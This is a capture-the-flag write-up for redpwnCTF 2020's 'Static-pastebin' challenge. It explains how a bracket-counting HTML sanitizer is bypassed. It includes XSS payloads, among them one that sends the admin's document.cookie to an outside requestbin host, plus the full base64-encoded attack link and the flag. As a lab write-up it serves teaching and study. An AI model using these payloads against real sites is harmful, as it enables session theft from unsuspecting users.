## Static-pastebin :

The description of this challenge was : " I wanted to make a website to store bits of text, but I don't have any experience with web development. However, I realized that I don't need any! If you experience any issues, make a paste and send it here "

The home page of the web site was presented like this:

![CaptureVero](https://user-images.githubusercontent.com/59454895/85900597-63acc800-b800-11ea-81fa-4d3b209847fa.PNG)

There was also a way to report a link to the admin:

![OOOOOO](https://user-images.githubusercontent.com/59454895/85901979-344b8a80-b803-11ea-9027-8e13f90dacdc.PNG)


First of all i tried to put <script>alert(1);</script> to see if the site would print the number one but it didn't work and i got this :

![Capture000](https://user-images.githubusercontent.com/59454895/85898838-49251f80-b7fd-11ea-85b8-91c018a2c048.PNG)

 Here i could notice that every post was base64 encoded when i pressed the button create , i got also this confirmation from the code of the site that was dealing the posts , because as we can see there is the btoa function that encodes the text value in base64 :
 
 ```javascript
 (async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const button = document.getElementById('button');
    button.addEventListener('click', () => {
        const text = document.getElementById('text');
        window.location = 'paste/#' + btoa(text.value);
    });
})();
```

After i made the post in the site i looked inside the source again to see how the reading part was handled  and i found some interesting code :
```javascript
(async () => {
    await new Promise((resolve) => {
        window.addEventListener('load', resolve);
    });

    const content = window.location.hash.substring(1);
    display(atob(content));
})();

function display(input) {
    document.getElementById('paste').innerHTML = clean(input);
}

function clean(input) {
    let brackets = 0;
    let result = '';
    for (let i = 0; i < input.length; i++) {
        const current = input.charAt(i);
        if (current == '<') {
            brackets ++;
        }
        if (brackets == 0) {
            result += current;
        }
        if (current == '>') {
            brackets --;
        }
    }
    return result
}

```
Reading this code i understood two important things , first of all the value from URL is decoded from base64 using the atob function ( It will be useful when i will report the link with the payload) and our input is sanitized with the clean function , looking inside this function i could see that the writing of text was not allowed if the bracket pairs didn't match . I broke this function just adding a > to my payload :
```javascript
test"><img src=x onerror=alert("22");>
```
![Test](https://user-images.githubusercontent.com/59454895/85903016-a45b1000-b805-11ea-8b64-ee6ca162333f.PNG)

Now that I know it works locally I modified my payload in this way :  ``` test"><img src=x onerror=window.location.href='https://en96oi0edd3dm.x.pipedream.net/?a='+document.cookie;>``` . I used a requestbin to intercept the admin's cookies.


The admin needs to visit the link or we can't intercept his cookie, so I encoded all my payload in base 64 and i inserted it in the link with this way :

https://static-pastebin.2020.redpwnc.tf/paste/#dGVzdCI+PGltZyBzcmM9eCBvbmVycm9yPXdpbmRvdy5sb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOTZvaTBlZGQzZG0ueC5waXBlZHJlYW0ubmV0Lz9hPScrZG9jdW1lbnQuY29va2llOz4=

The final step was to report this entire link to the admin and check the requestbin  :

![FlagStaticBin](https://user-images.githubusercontent.com/59454895/85904268-87740c00-b808-11ea-8c5e-bf24dc24d7a4.PNG)

Flag: flag{54n1t1z4t10n_k1nd4_h4rd}

